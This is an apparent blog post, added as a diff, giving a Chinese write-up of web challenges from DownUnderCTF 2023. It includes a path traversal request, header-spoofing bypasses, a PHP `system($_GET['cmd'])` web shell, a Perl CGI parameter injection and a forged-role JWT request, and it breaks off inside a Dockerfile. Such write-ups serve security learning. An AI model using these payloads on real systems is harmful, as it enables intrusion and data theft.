@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/@fortawesome/fontawesome-free@6.2.1/css/all.min.css" integrity="sha256-Z1K5uhUaJXA7Ll0XrZ/0JhX4lAtZFpT6jkKrEDT0drU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://unpkg.com/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"gudiffany.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="2023DownUnderCTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023DownUnderCTF">
+<meta property="og:url" content="https://gudiffany.github.io/2023/09/08/14-20-17/index.html">
+<meta property="og:site_name" content="diffany">
+<meta property="og:description" content="2023DownUnderCTF">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20230910152045585.png">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20230910152323396.png">
+<meta property="og:image" content="https://gudiffany.github.io/img/image-20230910152520657.png">
+<meta property="article:published_time" content="2023-09-08T06:20:17.000Z">
+<meta property="article:modified_time" content="2023-09-10T09:30:49.239Z">
+<meta property="article:author" content="diffany">
+<meta property="article:tag" content="2023ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gudiffany.github.io/img/image-20230910152045585.png">
+
+
+<link rel="canonical" href="https://gudiffany.github.io/2023/09/08/14-20-17/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://gudiffany.github.io/2023/09/08/14-20-17/","path":"2023/09/08/14-20-17/","title":"2023DownUnderCTF"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2023DownUnderCTF | diffany</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">diffany</p>
+      <i class="logo-line"></i>
+    </a>
+      <img class="custom-logo-image" src="/uploads/custom-logo.png" alt="diffany">
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-友情链接"><a href="/friend/" rel="section"><i class="fa fa-sitemap fa-fw"></i>友情链接</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">2023DownUnderCTF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">1.1.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#proxed"><span class="nav-number">1.1.1.</span> <span class="nav-text">proxed</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#static-file-server"><span class="nav-number">1.1.2.</span> <span class="nav-text">static-file-server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#xxd-server"><span class="nav-number">1.1.3.</span> <span class="nav-text">xxd-server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cgi-fridays"><span class="nav-number">1.1.4.</span> <span class="nav-text">cgi-fridays</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#actually-proxed"><span class="nav-number">1.1.5.</span> <span class="nav-text">actually-proxed</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#grades-grades-grades"><span class="nav-number">1.1.6.</span> <span class="nav-text">grades_grades_grades</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#strapi-in"><span class="nav-number">1.1.7.</span> <span class="nav-text">strapi-in</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#smooth-jazz"><span class="nav-number">1.1.8.</span> <span class="nav-text">smooth-jazz</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">diffany</p>
+  <div class="site-description" itemprop="description">一个努力学习的菜鸟</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://unpkg.com/@creativecommons/vocabulary@2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+        <div class="pjax">
+        </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://gudiffany.github.io/2023/09/08/14-20-17/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="diffany">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="diffany">
+      <meta itemprop="description" content="一个努力学习的菜鸟">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="2023DownUnderCTF | diffany">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2023DownUnderCTF<a href="https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name/_posts/2023DownUnderCTF.md" class="post-edit-link" title="编辑" rel="noopener" target="_blank"><i class="fa fa-pen-nib"></i></a>
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-09-08 14:20:17" itemprop="dateCreated datePublished" datetime="2023-09-08T14:20:17+08:00">2023-09-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-09-10 17:30:49" itemprop="dateModified" datetime="2023-09-10T17:30:49+08:00">2023-09-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/2023wp/" itemprop="url" rel="index"><span itemprop="name">2023wp</span></a>
+        </span>
+    </span>
+
+  
+    <span id="/2023/09/08/14-20-17/" class="post-meta-item leancloud_visitors" data-flag-title="2023DownUnderCTF" title="阅读次数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="leancloud-visitors-count"></span>
+    </span>
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1>2023DownUnderCTF</h1>
+<span id="more"></span>
+<h2 id="web">web</h2>
+<h3 id="proxed">proxed</h3>
+<p>直接使用XFF即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 31.33.33.7</span><br></pre></td></tr></table></figure>
+<h3 id="static-file-server">static-file-server</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET /files/../../../../../../flag.txt HTTP/1.1</span><br><span class="line">Host: 172.19.236.162:1337</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://172.19.236.162:1337/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6</span><br><span class="line">If-None-Match: &quot;178158b25fa3a400-1e&quot;</span><br><span class="line">If-Modified-Since: Sun, 03 Sep 2023 09:14:18 GMT</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="xxd-server">xxd-server</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xxd</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$s</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">	<span class="variable">$out</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$ctr</span> = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="title function_ invoke__">str_split</span>(<span class="variable">$s</span>, <span class="number">16</span>) <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">		<span class="variable">$hex_string</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27; &#x27;</span>, <span class="title function_ invoke__">str_split</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$v</span>), <span class="number">4</span>));</span><br><span class="line">		<span class="variable">$ascii_string</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="title function_ invoke__">str_split</span>(<span class="variable">$v</span>) <span class="keyword">as</span> <span class="variable">$c</span>) &#123;</span><br><span class="line">			<span class="variable">$ascii_string</span> .= <span class="variable">$c</span> &lt; <span class="string">&#x27; &#x27;</span> || <span class="variable">$c</span> &gt; <span class="string">&#x27;~&#x27;</span> ? <span class="string">&#x27;.&#x27;</span> : <span class="variable">$c</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%08x: %-40s %-16s\n&quot;</span>, <span class="variable">$ctr</span>, <span class="variable">$hex_string</span>, <span class="variable">$ascii_string</span>);</span><br><span class="line">		<span class="variable">$ctr</span> += <span class="number">16</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">xxd</span>(<span class="string">&quot;&lt;?php /*        */system(\$_GET/**/[\&quot;cmd\&quot;]);/*   */ ?&gt;&quot;</span>))</span><br></pre></td></tr></table></figure>
+<p>对于上面xxd可以使用注释构造出特定的shell文件，然后进行命令执行即可以</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">/*        */</span><span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span><span class="comment">/**/</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="comment">/*   */</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="cgi-fridays">cgi-fridays</h3>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">route_request</span> </span>&#123;</span><br><span class="line">	<span class="keyword">my</span> ($page, $remote_addr) = @_;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($page =~ <span class="regexp">/^about$/</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> HTDOCS . <span class="string">&#x27;/pages/about.txt&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($page =~ <span class="regexp">/^version$/</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;/proc/version&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($page =~ <span class="regexp">/^cpuinfo$/</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> HTDOCS . <span class="string">&#x27;/pages/denied.txt&#x27;</span> <span class="keyword">unless</span> $remote_addr eq <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;/proc/cpuinfo&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($page =~ <span class="regexp">/^stat|io|maps$/</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> HTDOCS . <span class="string">&#x27;/pages/denied.txt&#x27;</span> <span class="keyword">unless</span> $remote_addr eq <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;/proc/self/$page&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> HTDOCS . <span class="string">&#x27;/pages/home.txt&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>需要同时是本地发起的请求，而且目录存在<code>stat|io|maps</code>的字样</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span> $q = CGI::Minimal-&gt;new;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;Content-Type: text/html\r\n\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $file_path = route_request($q-&gt;param(<span class="string">&#x27;page&#x27;</span>), $ENV&#123;<span class="string">&#x27;REMOTE_ADDR&#x27;</span>&#125;);</span><br><span class="line"><span class="keyword">my</span> $file_content = read_file($file_path);</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> escape_html($file_content);</span><br></pre></td></tr></table></figure>
+<p>根据blackhat的一篇文章</p>
+<p><a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf">https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf</a></p>
+<p>可以知道<code>$q-&gt;param('page')</code>将会获得一个list，那么只要多个赋值就会覆盖$remote_addr</p>
+<p>然后使用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find -name <span class="string">&quot;*io*&quot;</span></span><br></pre></td></tr></table></figure>
+<p>找出一个含有io的目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://localhost:5000/?page=../../sys/bus/virtio/../../../../flag.txt&amp;page=127.0.0.1&#x27;</span></span><br></pre></td></tr></table></figure>
+<h3 id="actually-proxed">actually-proxed</h3>
+<p>在proxy的main.go中，存在一个</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i, v := <span class="keyword">range</span> headers &#123;</span><br><span class="line">		<span class="keyword">if</span> strings.ToLower(v[<span class="number">0</span>]) == <span class="string">&quot;x-forwarded-for&quot;</span> &#123;</span><br><span class="line">			headers[i][<span class="number">1</span>] = fmt.Sprintf(<span class="string">&quot;%s, %s&quot;</span>, v[<span class="number">1</span>], clientIP)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>对于这个对xff的过滤，实际上没有什么用，因为只会对第一个xff进行处理，但是如果放入两个xff，就会成功绕过</p>
+<p>然后在真正get flag的地方会将xff的最后一个传入给ip，然后成功绕过</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&#x27;X-Forwarded-For: 31.33.33.7&#x27;</span> -H <span class="string">&#x27;X-Forwarded-For: 31.33.33.7&#x27;</span> 127.0.0.1:8080</span><br></pre></td></tr></table></figure>
+<h3 id="grades-grades-grades">grades_grades_grades</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /signup HTTP/1.1</span><br><span class="line">Host: 100.100.1.3:1337</span><br><span class="line">Content-Length: 57</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://100.100.1.3:1337</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://100.100.1.3:1337/signup</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">stu_num=a&amp;stu_email=a%40qq.com&amp;password=a&amp;is_teacher=True</span><br></pre></td></tr></table></figure>
+<p>根据逻辑可以伪造<code>is_teacher=True</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        jwt_data = request.form.to_dict()</span><br><span class="line">        jwt_cookie = current_app.auth.create_token(jwt_data)</span><br><span class="line">        <span class="keyword">if</span> is_teacher_role():</span><br><span class="line">            response = make_response(redirect(url_for(<span class="string">&#x27;api.index&#x27;</span>, is_auth=<span class="literal">True</span>, is_teacher_role=<span class="literal">True</span>)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            response = make_response(redirect(url_for(<span class="string">&#x27;api.index&#x27;</span>, is_auth=<span class="literal">True</span>)))</span><br><span class="line">        </span><br><span class="line">        response.set_cookie(<span class="string">&#x27;auth_token&#x27;</span>, jwt_cookie, httponly=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;signup.html&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>然后用JWT去获取flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET /grades_flag HTTP/1.1</span><br><span class="line">Host: 100.100.1.3:1337</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://100.100.1.3:1337</span><br><span class="line">Cookie: auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdHVfbnVtIjoiYSIsInN0dV9lbWFpbCI6ImFAcXEuY29tIiwicGFzc3dvcmQiOiJhIiwiaXNfdGVhY2hlciI6IlRydWUifQ.K2c3wh7wWQmWDd6m_hJDA5509mTMYcRRehKUtMtEtyc</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://100.100.1.3:1337/signup</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">X-Forwarded-For: 210.37.157.7</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="strapi-in">strapi-in</h3>
+<p>这题复现的过程中最难的不是理解，而是docker建立，npm install一直起不来，最后还是npm走一下主机的代理还要升级一下npm才起来的</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:<span class="number">18</span>-alpine</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /opt/strapi-in</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./package.json /opt/strapi-in/package.json</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./package-lock.json /opt/strapi-in/package-lock.json</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm config <span class="built_in">set</span> proxy http://ip:10086</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm config <span class="built_in">set</span> https-proxy http://ip:10086</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm <span class="built_in">set</span> progress=<span class="literal">true</span></span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm install -g npm@latest</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm install</span></span><br><span class="line"><span class="keyword">ENV</span> PATH /opt/node_modules/.bin:$PATH</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . .</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mv</span> /opt/strapi-in/flag.txt /flag.txt</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> -R node:node /opt/strapi-in/data</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> -R node:node /opt/strapi-in/public/uploads</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> node:node /opt/strapi-in/.env</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm run build</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> node</span><br><span class="line"><span class="keyword">CMD</span><span 